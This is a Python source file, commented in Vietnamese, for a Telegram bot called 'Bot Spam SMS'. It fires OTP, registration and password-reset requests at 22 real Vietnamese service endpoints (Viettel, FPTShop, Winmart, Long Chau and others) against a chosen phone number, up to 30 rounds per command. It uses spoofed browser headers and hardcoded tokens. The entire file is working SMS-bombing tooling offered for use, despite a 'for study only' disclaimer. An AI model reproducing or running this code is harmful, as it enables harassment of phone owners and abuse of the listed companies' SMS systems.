import requests
import sys
import time
import json
import os
import logging
import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Cấu hình
MAX_WORKERS = 20
TGAN = 1

# ==================== CÁC HÀM SPAM ====================

def medigoapp(phone):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://www.medigoapp.com',
            'referer': 'https://www.medigoapp.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        phone_num = '+84' + phone[1:] if phone.startswith('0') else '+84' + phone
        json_data = {'phone': phone_num}
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data, timeout=10)
        return f"✅ Medigoapp: {response.status_code}"
    except Exception as e:
        return f"❌ Medigoapp: {str(e)[:50]}"

def ecogreen(phone):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://ecogreen.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'phone': phone}
        response = requests.post('https://ecogreen.com.vn/api/auth/register/send-otp', headers=headers, json=json_data, timeout=10)
        return f"✅ Ecogreen: {response.status_code}"
    except Exception as e:
        return f"❌ Ecogreen: {str(e)[:50]}"

def beecow(phone):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://www.gomua.vn',
            'referer': 'https://www.gomua.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {
            'password': '1234gt]mah',
            'mobile': {'countryCode': '+84', 'phoneNumber': phone},
            'displayName': 'que huong',
            'locationCode': 'VN',
            'langKey': 'vi'
        }
        response = requests.post('https://api.beecow.com/api/register2/mobile/phone', headers=headers, json=json_data, timeout=10)
        return f"✅ Beecow: {response.status_code}"
    except Exception as e:
        return f"❌ Beecow: {str(e)[:50]}"

def tv360(phone):
    try:
        phone_clean = phone[-10:] if len(phone) > 10 else phone
        response = requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login",
                                headers={"Content-Type": "application/json"},
                                json={"msisdn": phone_clean}, timeout=10)
        return f"✅ TV360: {response.status_code}"
    except Exception as e:
        return f"❌ TV360: {str(e)[:50]}"

def phuclong(phone):
    try:
        response = requests.post("https://api-crownx.winmart.vn/as/api/plg/v1/user/forgot-pwd",
                                headers={"content-type": "application/json"},
                                json={"userName": phone}, timeout=10)
        return f"✅ PhucLong: {response.status_code}"
    except Exception as e:
        return f"❌ PhucLong: {str(e)[:50]}"

def fm(phone):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://fm.com.vn',
            'referer': 'https://fm.com.vn/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'Phone': phone, 'LatOfMap': '106', 'LongOfMap': '108', 'Browser': ''}
        response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ FM: {response.status_code}"
    except Exception as e:
        return f"❌ FM: {str(e)[:50]}"

def robot(phone):
    try:
        headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://vietloan.vn',
            'referer': 'https://vietloan.vn/register',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        data = {'phone': phone, '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU'}
        response = requests.post('https://vietloan.vn/register/phone-resend',
                                headers=headers, data=data, timeout=10)
        return f"✅ Robot: {response.status_code}"
    except Exception as e:
        return f"❌ Robot: {str(e)[:50]}"

def batdongsan(phone):
    try:
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        params = {'phoneNumber': phone}
        response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',
                               params=params, headers=headers, timeout=10)
        return f"✅ BatDongSan: {response.status_code}"
    except Exception as e:
        return f"❌ BatDongSan: {str(e)[:50]}"

def dvcd(phone):
    try:
        headers = {
            'Content-Type': 'application/json;charset=UTF-8',
            'Origin': 'https://viettel.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'msisdn': phone}
        response = requests.post('https://viettel.vn/api/get-otp', headers=headers, json=json_data, timeout=10)
        return f"✅ Viettel: {response.status_code}"
    except Exception as e:
        return f"❌ Viettel: {str(e)[:50]}"

def mocha(phone):
    try:
        headers = {
            'Origin': 'https://video.mocha.com.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        params = {'msisdn': phone, 'languageCode': 'vi'}
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp',
                                params=params, headers=headers, timeout=10)
        return f"✅ Mocha: {response.status_code}"
    except Exception as e:
        return f"❌ Mocha: {str(e)[:50]}"

def fptshop(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://fptshop.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'fromSys': 'WEBKHICT', 'otpType': '0', 'phoneNumber': phone}
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ FPTShop: {response.status_code}"
    except Exception as e:
        return f"❌ FPTShop: {str(e)[:50]}"

def winmart(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://winmart.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-api-merchant': 'WCM'
        }
        json_data = {'firstName': 'Taylor Jasmine', 'phoneNumber': phone,
                    'masanReferralCode': '', 'dobDate': '2005-08-05', 'gender': 'Male'}
        response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ Winmart: {response.status_code}"
    except Exception as e:
        return f"❌ Winmart: {str(e)[:50]}"

def ghn(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://sso.ghn.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'phone': phone, 'type': 'register'}
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ GHN: {response.status_code}"
    except Exception as e:
        return f"❌ GHN: {str(e)[:50]}"

def vayvnd(phone):
    try:
        headers = {
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://vayvnd.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'site-id': '3'
        }
        json_data = {'login': phone, 'trackingId': '8Y6vKPEgdnxhamRfAJw7IrW3nwVYJ6BHzIdygaPd1S9urrRIVnFibuYY0udN46Z3'}
        response = requests.post('https://api.vayvnd.vn/v2/users/password-reset',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ VayVND: {response.status_code}"
    except Exception as e:
        return f"❌ VayVND: {str(e)[:50]}"

def lon(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://nhathuoclongchau.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-channel': 'EStore'
        }
        json_data = {'phoneNumber': phone, 'otpType': 0, 'fromSys': 'WEBKHLC'}
        response = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ LongChau: {response.status_code}"
    except Exception as e:
        return f"❌ LongChau: {str(e)[:50]}"

def vato(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://futabus.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-app-id': 'client'
        }
        json_data = {'phoneNumber': phone, 'deviceId': 'e3025fb7-5436-4002-9950-e6564b3656a6', 'use_for': 'LOGIN'}
        response = requests.post('https://api.vato.vn/api/authenticate/request_code',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ Vato: {response.status_code}"
    except Exception as e:
        return f"❌ Vato: {str(e)[:50]}"

def vinamilk(phone):
    try:
        headers = {
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://new.vinamilk.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        data = '{"type":"register","phone":"' + phone + '"}'
        response = requests.post('https://new.vinamilk.com.vn/api/account/getotp',
                                headers=headers, data=data, timeout=10)
        return f"✅ Vinamilk: {response.status_code}"
    except Exception as e:
        return f"❌ Vinamilk: {str(e)[:50]}"

def ankhang(phone):
    try:
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://www.nhathuocankhang.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'X-Requested-With': 'XMLHttpRequest'
        }
        data = {'phoneNumber': phone, 'isReSend': 'false', 'sendOTPType': '1',
                '__RequestVerificationToken': 'CfDJ8AOPS3HyLgBFlxCZc71KlZM4jQU9OK9b1DUn5ys7aKZViPrpybaiUbsmuKMJZcke6CgT4eDk1wOuPCfN7avFnvLJT8N7pjy_N5nG17FGesjJq1photurB6sAQ50kCSSxPXPyi6lg7uUQRHgvO6fG9Ak'}
        response = requests.post('https://www.nhathuocankhang.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
                                headers=headers, data=data, timeout=10)
        return f"✅ AnKhang: {response.status_code}"
    except Exception as e:
        return f"❌ AnKhang: {str(e)[:50]}"

def sapo(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://accounts.sapo.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        data = '{"country_code":"84","phone_number":"' + phone + '","type":"REQUEST_REGISTER","register_token":"rHEYbHr6Sd4CMhZMl2d46tvDWp2e0gCMJv8U"}'
        response = requests.post('https://accounts.sapo.vn/otp/send', headers=headers, data=data, timeout=10)
        return f"✅ Sapo: {response.status_code}"
    except Exception as e:
        return f"❌ Sapo: {str(e)[:50]}"

def thefaceshop(phone):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://thefaceshop.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        json_data = {'phoneNumber': phone}
        response = requests.post('https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
                                headers=headers, json=json_data, timeout=10)
        return f"✅ TheFaceShop: {response.status_code}"
    except Exception as e:
        return f"❌ TheFaceShop: {str(e)[:50]}"

def air(phone):
    try:
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://vietair.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        data = {
            'op': 'PACKAGE_HTTP_POST',
            'path_ajax_post': '/service03/sms/get',
            'package_name': 'PK_FD_SMS_OTP',
            'object_name': 'INS',
            'P_MOBILE': phone,
            'P_TYPE_ACTIVE_CODE': 'DANG_KY_NHAN_OTP'
        }
        response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx',
                                headers=headers, data=data, timeout=10)
        return f"✅ VietAir: {response.status_code}"
    except Exception as e:
        return f"❌ VietAir: {str(e)[:50]}"

def mytv(phone):
    try:
        headers = {
            'content-type': 'application/json',
            'origin': 'https://mytv.com.vn',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        data = '{"login_type":1,"email":null,"phone":"' + phone + '","type":2}'
        response = requests.post("https://apigw.mytv.vn/api/v1/authen-handle/sendOTP",
                                headers=headers, data=data, timeout=10)
        return f"✅ MyTV: {response.status_code}"
    except Exception as e:
        return f"❌ MyTV: {str(e)[:50]}"

# Danh sách các hàm spam
ham = [
    medigoapp, ecogreen, beecow, tv360, phuclong, fm, robot,
    batdongsan, dvcd, mocha, fptshop, winmart, ghn, vayvnd,
    lon, vato, vinamilk, ankhang, sapo, thefaceshop, air, mytv
]

# ==================== BOT TELEGRAM ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /start"""
    await update.message.reply_text(
        "🤖 *Bot Spam SMS*\n\n"
        "Gửi OTP spam đến số điện thoại Việt Nam\n\n"
        "*Cách dùng:*\n"
        "/spam <số_điện_thoại> <số_lần>\n"
        "Ví dụ: `/spam 0987654321 5`\n\n"
        "*Các lệnh khác:*\n"
        "/services - Danh sách dịch vụ\n"
        "/help - Hướng dẫn chi tiết\n\n"
        "⚠️ *Cảnh báo:* Chỉ sử dụng cho mục đích học tập!",
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /help"""
    help_text = (
        "📖 *Hướng dẫn sử dụng*\n\n"
        "*Các lệnh:*\n"
        "/start - Khởi động bot\n"
        "/help - Hiển thị hướng dẫn\n"
        "/spam <số> <lần> - Gửi OTP spam\n"
        "/services - Danh sách dịch vụ\n\n"
        "*Ví dụ:*\n"
        "`/spam 0987654321 3`\n\n"
        "*Thông số:*\n"
        f"- Số dịch vụ: {len(ham)}\n"
        "- Số lần spam tối đa: 30\n"
        "- Thời gian giữa các lần: 1 giây\n\n"
        "⚠️ *Lưu ý:*\n"
        "- Số điện thoại bắt đầu bằng 0 hoặc 84\n"
        "- Chỉ dùng cho mục đích học tập\n"
        "- Bot có thể bị giới hạn request"
    )
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def services_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /services"""
    services_list = ["📱 *Danh sách dịch vụ hỗ trợ:*\n"]
    for idx, func in enumerate(ham, 1):
        services_list.append(f"{idx}. {func.__name__.title()}")
    
    services_list.append(f"\n📊 *Tổng số:* {len(ham)} dịch vụ")
    await update.message.reply_text("\n".join(services_list), parse_mode='Markdown')

async def spam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Xử lý lệnh /spam"""
    try:
        # Kiểm tra đủ tham số
        if len(context.args) < 2:
            await update.message.reply_text(
                "❌ *Thiếu tham số!*\n\n"
                "Cách dùng: `/spam <số_điện_thoại> <số_lần>`\n"
                "Ví dụ: `/spam 0987654321 5`",
                parse_mode='Markdown'
            )
            return
        
        phone = context.args[0]
        amount = int(context.args[1])
        
        # Kiểm tra số lần spam hợp lệ
        if amount <= 0 or amount > 30:
            await update.message.reply_text("❌ Số lần spam phải từ 1-30!")
            return
        
        # Kiểm tra số điện thoại
        phone_clean = phone.replace('+84', '0').replace('84', '0')
        if not phone_clean.isdigit() or len(phone_clean) < 9 or len(phone_clean) > 11:
            await update.message.reply_text("❌ Số điện thoại không hợp lệ!")
            return
        
        phone = phone_clean
        
        # Gửi thông báo bắt đầu
        msg = await update.message.reply_text(
            f"🚀 *Đang spam OTP đến số {phone}*\n"
            f"📊 Số lần: {amount}\n"
            f"📱 Số dịch vụ: {len(ham)}\n"
            f"⏳ Đang xử lý, vui lòng chờ...",
            parse_mode='Markdown'
        )
        
        # Chạy spam với ThreadPoolExecutor
        results = []
        total_tasks = amount * len(ham)
        
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for i in range(amount):
                for func in ham:
                    futures.append(executor.submit(func, phone))
                    time.sleep(TGAN)
            
            # Cập nhật tiến trình
            completed = 0
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=15)
                    results.append(result)
                    completed += 1
                    
                    # Cập nhật tiến trình mỗi 10% hoặc 10 kết quả
                    if completed % max(1, total_tasks // 10) == 0:
                        await msg.edit_text(
                            f"🚀 *Đang spam số {phone}*\n"
                            f"📊 Tiến độ: {completed}/{total_tasks} ({completed*100//total_tasks}%)",
                            parse_mode='Markdown'
                        )
                except Exception as e:
                    results.append(f"❌ Lỗi: {str(e)[:50]}")
        
        # Đếm kết quả thành công/thất bại
        success = sum(1 for r in results if r and r.startswith('✅'))
        failed = len(results) - success
        
        # Tạo kết quả
        result_text = f"✅ *Hoàn thành spam số {phone}*\n"
        result_text += f"📊 *Kết quả:* ✅ {success} thành công | ❌ {failed} thất bại\n\n"
        result_text += "*Chi tiết:*\n"
        
        # Nhóm kết quả theo dịch vụ
        service_results = {}
        for r in results:
            if r:
                service_name = r.split(':')[0].replace('✅ ', '').replace('❌ ', '')
                if service_name not in service_results:
                    service_results[service_name] = []
                service_results[service_name].append(r)
        
        # Hiển thị kết quả
        for service, res_list in list(service_results.items())[:15]:
            success_count = sum(1 for r in res_list if r.startswith('✅'))
            result_text += f"• {service}: {success_count}/{len(res_list)}\n"
        
        if len(service_results) > 15:
            result_text += f"\n... và {len(service_results) - 15} dịch vụ khác"
        
        # Giới hạn độ dài
        if len(result_text) > 4000:
            result_text = result_text[:4000] + "\n\n... (bị cắt do quá dài)"
        
        await msg.edit_text(result_text, parse_mode='Markdown')
        
    except ValueError:
        await update.message.reply_text("❌ Số lần spam phải là số nguyên!")
    except Exception as e:
        logger.error(f"Lỗi spam: {str(e)}")
        await update.message.reply_text(f"❌ Đã xảy ra lỗi: {str(e)[:100]}")

async def run_bot():
    """Khởi chạy bot"""
    TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
    
    if not TOKEN:
        logger.error("Không tìm thấy TELEGRAM_BOT_TOKEN trong biến môi trường!")
        sys.exit(1)
    
    # Tạo ứng dụng
    application = Application.builder().token(TOKEN).build()
    
    # Thêm handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("spam", spam_command))
    application.add_handler(CommandHandler("services", services_command))
    
    # Khởi chạy bot
    logger.info("Bot đang chạy...")
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    # Giữ bot chạy
    try:
        await asyncio.Event().wait()
    except KeyboardInterrupt:
        pass
    finally:
        await application.updater.stop()
        await application.stop()
        await application.shutdown()

def main():
    """Entry point"""
    asyncio.run(run_bot())

if __name__ == "__main__":
    main()
